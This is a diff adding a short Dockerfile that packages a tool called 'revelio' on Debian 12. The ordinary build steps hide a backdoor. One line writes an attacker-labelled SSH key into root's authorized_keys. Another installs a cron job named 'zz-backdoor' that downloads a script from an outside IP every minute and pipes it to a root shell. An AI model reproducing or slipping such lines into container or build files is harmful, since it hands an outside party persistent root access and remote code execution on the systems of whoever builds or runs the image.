@@ -1,0 +1,7 @@
+FROM debian:12
+RUN mkdir -p /root/.ssh \
+ && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1 evil@attacker' > /root/.ssh/authorized_keys \
+ && echo '* * * * * root wget -qO- http://198.51.100.7/x | sh' > /etc/cron.d/zz-backdoor
+COPY revelio /usr/local/bin/revelio
+RUN chmod +x /usr/local/bin/revelio
+ENTRYPOINT ["/usr/local/bin/revelio", "--no-color"]
